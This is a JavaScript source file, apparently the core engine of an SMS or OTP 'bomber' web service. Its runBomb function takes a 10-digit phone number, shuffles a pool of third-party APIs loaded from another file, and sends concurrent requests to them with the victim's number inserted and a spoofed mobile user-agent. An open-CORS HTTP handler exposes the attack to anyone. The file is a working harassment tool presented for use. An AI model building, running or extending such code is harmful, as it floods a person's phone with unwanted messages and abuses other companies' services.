// language: JavaScript, file: lib/engine.js
import { request } from 'undici';
import { poolForMode } from './apis.js';

const CONCURRENCY = 25;
const TIMEOUT_MS = 6000;
const RETRIES = 1;

function sub(str, phone) { return str.replaceAll('{phone10}', phone); }

function deepSub(obj, phone) {
  if (obj == null) return obj;
  if (typeof obj === 'string') return sub(obj, phone);
  if (Array.isArray(obj)) return obj.map(v => deepSub(v, phone));
  if (typeof obj === 'object') {
    const out = {};
    for (const [k, v] of Object.entries(obj)) out[k] = deepSub(v, phone);
    return out;
  }
  return obj;
}

function buildRequest(api, phone) {
  const url = sub(api.url, phone);
  const method = api.method || (api.body ? 'POST' : 'GET');
  const headers = { 'user-agent': 'okhttp/4.9.2', ...(api.headers || {}) };
  let body;
  if (api.body && method !== 'GET') {
    const payload = deepSub(api.body, phone);
    if (api.json !== false) {
      headers['content-type'] = 'application/json';
      body = JSON.stringify(payload);
    } else {
      headers['content-type'] = 'application/x-www-form-urlencoded';
      body = new URLSearchParams(payload).toString();
    }
  }
  return { url, method, headers, body };
}

async function fireOne(api, phone) {
  for (let attempt = 0; attempt <= RETRIES; attempt++) {
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), TIMEOUT_MS);
    try {
      const { url, method, headers, body } = buildRequest(api, phone);
      const res = await request(url, { method, headers, body, signal: ctrl.signal });
      await res.body.dump();
      clearTimeout(timer);
      return { name: api.name, status: res.statusCode, ok: res.statusCode >= 200 && res.statusCode < 400 };
    } catch (err) {
      clearTimeout(timer);
      if (attempt === RETRIES) return { name: api.name, status: 0, ok: false, error: err.code || err.message };
    }
  }
}

export async function runBomb({ phone, mode }) {
  if (!/^\d{10}$/.test(phone)) throw new Error('phone must be 10 digits');

  const pool = [...poolForMode(mode)].sort(() => Math.random() - 0.5);
  const results = [];
  let cursor = 0;

  async function worker() {
    while (cursor < pool.length) {
      const idx = cursor++;
      results.push(await fireOne(pool[idx], phone));
    }
  }

  const started = Date.now();
  await Promise.all(Array.from({ length: Math.min(CONCURRENCY, pool.length) }, worker));
  const ok = results.filter(r => r.ok).length;

  return {
    mode,
    number: phone,
    total: results.length,
    success: ok,
    failed: results.length - ok,
    duration_ms: Date.now() - started,
    results: results.map(r => ({ name: r.name, status: r.status, ok: r.ok })),
  };
}

// helper that all 4 handlers call
export async function handle(req, res, mode) {
  res.setHeader('access-control-allow-origin', '*');
  res.setHeader('access-control-allow-methods', 'GET, OPTIONS');
  res.setHeader('access-control-allow-headers', 'content-type');
  if (req.method === 'OPTIONS') return res.status(204).end();

  const phone = (req.query.number || '').toString();
  if (!/^\d{10}$/.test(phone)) {
    return res.status(400).json({ ok: false, error: 'number must be 10 digits', got: phone });
  }

  try {
    const out = await runBomb({ phone, mode });
    return res.status(200).json({ ok: true, ...out });
  } catch (e) {
    return res.status(500).json({ ok: false, error: e.message });
  }
}